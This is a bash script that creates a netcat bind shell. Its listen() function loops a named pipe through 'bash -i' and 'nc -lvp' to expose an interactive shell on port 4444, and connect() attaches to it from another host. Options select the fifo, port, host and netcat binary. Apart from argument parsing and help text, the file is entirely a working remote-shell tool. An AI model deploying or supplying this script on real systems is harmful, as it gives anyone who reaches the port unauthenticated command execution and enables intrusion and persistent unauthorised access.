#!/usr/bin/env bash

connect() {
    $nc $host $port
}

listen() {
    while :; do
        rm -f $fifo
        mkfifo $fifo
        cat $fifo | bash -i 2>&1 | $nc -lvp $port >$fifo
        sleep 1
    done
    rm -f $fifo
}

usage() {
    echo "Usage: ${0/*\//} [OPTIONS]"
    echo
    echo "Create a bind shell"
    echo
    echo "Options:"
    echo "    -c, --connect      Connect to a listening bind_shell"
    echo "                       instance"
    echo "    -f, --fifo=FIFO    Use the specified fifo"
    echo "    -h, --help         Display this help message"
    echo "    --host=HOST        Use the specified host"
    echo "    -l, --listen       Listen for a connection from a"
    echo "                       connecting bind_shell instance"
    echo "    --nc=NC            Use the specified nc binary"
    echo "    -p, --port=PORT    Use the specified port"
    echo
    exit $1
}

declare -a args

fifo="/tmp/f"
unset host
if [[ -n $(command -v nc) ]]; then
    nc="$(command -v nc)"
elif [[ -n $(command -v ncat) ]]; then
    nc="$(command -v ncat)"
elif [[ -n $(command -v netcat) ]]; then
    nc="$(command -v netcat)"
fi
port=4444

while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-c"|"--connect") action="connect" ;;
        "-f"|"--fifo"*)
            case "$1" in
                "--"*"="*)
                    arg="$(echo "$1" | sed -r "s/[^=]+=//")"
                    [[ -n $arg ]] || usage 1
                    ;;
                *) shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
            esac
            fifo="$arg"
            ;;
        "-h"|"--help") usage 0 ;;
        "--host"*)
            case "$1" in
                "--"*"="*)
                    arg="$(echo "$1" | sed -r "s/[^=]+=//")"
                    [[ -n $arg ]] || usage 1
                    ;;
                *) shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
            esac
            host="$arg"
            ;;
        "-l"|"--listen") action="listen" ;;
        "--nc"*)
            case "$1" in
                "--"*"="*)
                    arg="$(echo "$1" | sed -r "s/[^=]+=//")"
                    [[ -n $arg ]] || usage 1
                    ;;
                *) shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
            esac
            nc="$arg"
            ;;
        "-p"|"--port"*)
            case "$1" in
                "--"*"="*)
                    arg="$(echo "$1" | sed -r "s/[^=]+=//")"
                    [[ -n $arg ]] || usage 1
                    ;;
                *) shift; [[ $# -gt 0 ]] || usage 1; arg="$1" ;;
            esac
            port="$arg"
            ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ -z ${args[@]} ]] || set -- "${args[@]}"

[[ $# -eq 0 ]] || usage 2
[[ -n $action ]] || usage 3
[[ -n $nc ]] || usage 4
[[ -f $nc ]] || usage 5

case "$action" in
    "connect") [[ -n $host ]] || usage 6
        connect
        ;;
    "listen") listen ;;
esac
